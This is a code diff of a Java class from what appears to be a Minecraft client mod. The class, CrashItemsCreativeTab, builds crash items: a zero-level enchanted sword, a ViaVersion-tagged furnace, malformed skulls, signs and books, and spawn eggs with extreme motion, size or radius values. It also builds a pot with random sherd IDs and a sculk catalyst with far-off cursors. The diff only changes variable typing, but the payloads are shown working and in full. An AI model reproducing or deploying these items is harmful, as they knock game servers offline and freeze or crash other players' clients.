@@ -15,7 +15,10 @@ import java.util.Collection;
 public class CrashItemsCreativeTab extends CreativeTab {
 
     public CrashItemsCreativeTab() {
-        super(new ItemStack(Items.BARRIER).setCustomName(Text.literal("Crash Items")));
+        super(
+                Text.literal("Crash Items"),
+                new ItemStack(Items.BARRIER)
+        );
     }
 
     @Override
@@ -54,11 +57,11 @@ public class CrashItemsCreativeTab extends CreativeTab {
     }
 
     private ItemStack createSwordCrasher() {
-        final var item = new ItemStack(Items.DIAMOND_SWORD);
-        final var base = item.getOrCreateNbt();
-        final var enchantments = new NbtList();
+        final ItemStack item = new ItemStack(Items.DIAMOND_SWORD);
+        final NbtCompound base = item.getOrCreateNbt();
+        final NbtList enchantments = new NbtList();
 
-        final var crashEnchantment = new NbtCompound();
+        final NbtCompound crashEnchantment = new NbtCompound();
         crashEnchantment.putString("id", "minecraft:bane_of_arthropods");
         crashEnchantment.putShort("lvl", (short) 0);
 
@@ -69,18 +72,18 @@ public class CrashItemsCreativeTab extends CreativeTab {
     }
 
     private ItemStack createViaVersionCrashFurnace() {
-        final var item = new ItemStack(Items.FURNACE);
-        final var base = new NbtCompound();
+        final ItemStack item = new ItemStack(Items.FURNACE);
+        final NbtCompound base = new NbtCompound();
 
-        final var blockEntityTag = new NbtCompound();
-        final var items = new NbtList();
+        final NbtCompound blockEntityTag = new NbtCompound();
+        final NbtList items = new NbtList();
 
-        final var firstSlot = new NbtCompound();
+        final NbtCompound firstSlot = new NbtCompound();
         firstSlot.putByte("Slot", (byte) 0);
         firstSlot.putString("id", "minecraft:stone");
         firstSlot.putByte("Count", (byte) 1);
 
-        final var tag = new NbtCompound();
+        final NbtCompound tag = new NbtCompound();
         tag.putInt("VB|Protocol1_12_2To1_13|2", 0);
         firstSlot.put("tag", tag);
 
@@ -95,20 +98,20 @@ public class CrashItemsCreativeTab extends CreativeTab {
     }
 
     private ItemStack createCrashSkull(final String value) {
-        final var item = new ItemStack(Items.PLAYER_HEAD);
-        final var base = new NbtCompound();
+        final ItemStack item = new ItemStack(Items.PLAYER_HEAD);
+        final NbtCompound base = new NbtCompound();
 
-        final var properties = new NbtCompound();
-        final var textures = new NbtList();
+        final NbtCompound properties = new NbtCompound();
+        final NbtList textures = new NbtList();
 
-        final var data = new NbtCompound();
+        final NbtCompound data = new NbtCompound();
         data.putString("Signature", "RlOgHNDlW3KdoWBda6VoMWqvD21ESva9BC6DvexuutaLdBwLuFpf/5kHVnQV6DcjbON9A8H4QY1D9GiYly468B+KzSpTRo/JeyDYr96uQc9RTq+U62uxxcDodgo4d465RJtx7TXIzVJX00OQqX1xHU3q6Lquk+iV4QFHRd/O3nzFVt8d2iWyArshMtXUZTtoGPthK8JrbWHI+EHBWNfSFU4MM40yD/7BCC/Td23x4LGP+gm4y6N2PyD6WLolGD8qXzRW5T5UMTbABU1/e6V/nAPYz7dTDuGVCh+x9qCDWt0a7Du6/31wo67mKysHD7Jp5QL/AT/uuP6N+DGi2/HeWDZJwm+cdH93mpCmK74cO71m/FwCBuC3QxI8GfhtXkS22dI+5bMEbLTMcrWyWwM1+7nciXQA/CGtmZpSCfiJI595nX4pmIG2YVCVy9OzVsnIjNt0vL5UfIJasWu3GkIOepuHeaE9HZ/Vw/XWncGBEAURitbPeRZj2slSTPoP1sx3J5LrObCY8L1HqazMLYeX5VulR49YJmg7PEQUsi/mQJAwj0xnHx7bCPWiNcMNOFHUoAUF1MDGZvSmiw7cfMClOpp+wzJB1kWnDRQmoCXnsk5nX2wYqiXXqJ6TkuOKk7BhiKjUtTVSv9eyUn2xZfcn9nxcolr0fmNH+brDAsVIMug=");
         data.putString("Value", value);
         textures.add(data);
 
         properties.put("textures", textures);
 
-        final var skullOwner = new NbtCompound();
+        final NbtCompound skullOwner = new NbtCompound();
         skullOwner.putIntArray("Id", new int[]{-1543419622, 14829807, -1493208798, 1828353364});
         skullOwner.put("Properties", properties);
         skullOwner.putString("Name", "ed0cinU");
@@ -120,10 +123,10 @@ public class CrashItemsCreativeTab extends CreativeTab {
     }
 
     private ItemStack createCrashSign(final String component) {
-        final var item = new ItemStack(Items.OAK_SIGN);
-        final var base = item.getOrCreateNbt();
+        final ItemStack item = new ItemStack(Items.OAK_SIGN);
+        final NbtCompound base = item.getOrCreateNbt();
 
-        final var blockEntityTag = new NbtCompound();
+        final NbtCompound blockEntityTag = new NbtCompound();
         blockEntityTag.put("Text1", NbtString.of(Text.Serializer.toJson(Text.translatable(component))));
         blockEntityTag.put("Text2", NbtString.of(Text.Serializer.toJson(Text.literal(""))));
         blockEntityTag.put("Text3", NbtString.of(Text.Serializer.toJson(Text.literal(""))));
@@ -135,9 +138,9 @@ public class CrashItemsCreativeTab extends CreativeTab {
     }
 
     private ItemStack createCrashBook(final String component) {
-        final var item = new ItemStack(Items.WRITTEN_BOOK);
+        final ItemStack item = new ItemStack(Items.WRITTEN_BOOK);
 
-        final var pages = new NbtList();
+        final NbtList pages = new NbtList();
         pages.add(NbtString.of(Text.Serializer.toJson(Text.translatable(component))));
         item.setSubNbt("pages", pages);
 
@@ -148,10 +151,10 @@ public class CrashItemsCreativeTab extends CreativeTab {
     }
 
     private ItemStack createClientCrashExperience() {
-        final var item = new ItemStack(Items.SHEEP_SPAWN_EGG);
-        final var base = new NbtCompound();
+        final ItemStack item = new ItemStack(Items.SHEEP_SPAWN_EGG);
+        final NbtCompound base = new NbtCompound();
 
-        final var entityTag = new NbtCompound();
+        final NbtCompound entityTag = new NbtCompound();
         entityTag.putString("CustomName", Text.Serializer.toJson(Text.literal("#".repeat(10000)).formatted(Formatting.DARK_GREEN, Formatting.BOLD, Formatting.UNDERLINE, Formatting.STRIKETHROUGH, Formatting.ITALIC, Formatting.OBFUSCATED)));
         entityTag.putInt("Value", 1337);
         entityTag.putInt("Count", 999999);
@@ -167,12 +170,12 @@ public class CrashItemsCreativeTab extends CreativeTab {
     }
 
     private ItemStack createServerCrashEntity() {
-        final var item = new ItemStack(Items.BAT_SPAWN_EGG);
-        final var base = new NbtCompound();
+        final ItemStack item = new ItemStack(Items.BAT_SPAWN_EGG);
+        final NbtCompound base = new NbtCompound();
 
-        final var entityTag = new NbtCompound();
+        final NbtCompound entityTag = new NbtCompound();
 
-        final var power = new NbtList();
+        final NbtList power = new NbtList();
         power.add(NbtDouble.of(1.0E43));
         power.add(NbtDouble.of(0));
         power.add(NbtDouble.of(0));
@@ -188,10 +191,10 @@ public class CrashItemsCreativeTab extends CreativeTab {
     }
 
     private ItemStack createClientCrashArea() {
-        final var item = new ItemStack(Items.SALMON_SPAWN_EGG);
-        final var base = new NbtCompound();
+        final ItemStack item = new ItemStack(Items.SALMON_SPAWN_EGG);
+        final NbtCompound base = new NbtCompound();
 
-        final var entityTag = new NbtCompound();
+        final NbtCompound entityTag = new NbtCompound();
         entityTag.putFloat("RadiusOnUse", 100f);
         entityTag.putFloat("RadiusPerTick", 1f);
         entityTag.putInt("Duration", 60000);
@@ -207,12 +210,12 @@ public class CrashItemsCreativeTab extends CreativeTab {
     }
 
     private ItemStack createClientInstantCrashPot() {
-        final var item = new ItemStack(Items.DECORATED_POT);
-        final var base = new NbtCompound();
+        final ItemStack item = new ItemStack(Items.DECORATED_POT);
+        final NbtCompound base = new NbtCompound();
 
-        final var blockEntityTag = new NbtCompound();
+        final NbtCompound blockEntityTag = new NbtCompound();
 
-        final var sherds = new NbtList();
+        final NbtList sherds = new NbtList();
         sherds.add(NbtString.of(RandomStringUtils.random(5).toLowerCase() + ":" + RandomStringUtils.random(5).toUpperCase()));
         blockEntityTag.put("sherds", sherds);
 
@@ -223,10 +226,10 @@ public class CrashItemsCreativeTab extends CreativeTab {
     }
 
     private ItemStack createSodiumClientFreezeEntity() {
-        final var item = new ItemStack(Items.BAT_SPAWN_EGG);
-        final var base = new NbtCompound();
+        final ItemStack item = new ItemStack(Items.BAT_SPAWN_EGG);
+        final NbtCompound base = new NbtCompound();
 
-        final var entityTag = new NbtCompound();
+        final NbtCompound entityTag = new NbtCompound();
         entityTag.putFloat("width", 999999F);
         entityTag.putFloat("height", 999999F);
         entityTag.putString("id", "minecraft:interaction");
@@ -238,14 +241,14 @@ public class CrashItemsCreativeTab extends CreativeTab {
     }
 
     public ItemStack createInstantCrashSculkItem() {
-        final var item = new ItemStack(Items.SCULK_CATALYST);
-        final var base = new NbtCompound();
+        final ItemStack item = new ItemStack(Items.SCULK_CATALYST);
+        final NbtCompound base = new NbtCompound();
 
-        final var blockEntityTag = new NbtCompound();
-        final var cursors = new NbtList();
+        final NbtCompound blockEntityTag = new NbtCompound();
+        final NbtList cursors = new NbtList();
 
-        final var firstCursor = new NbtCompound();
-        final var pos = new NbtList();
+        final NbtCompound firstCursor = new NbtCompound();
+        final NbtList pos = new NbtList();
         pos.add(NbtInt.of(900000000));
         pos.add(NbtInt.of(0));
         pos.add(NbtInt.of(900000000));
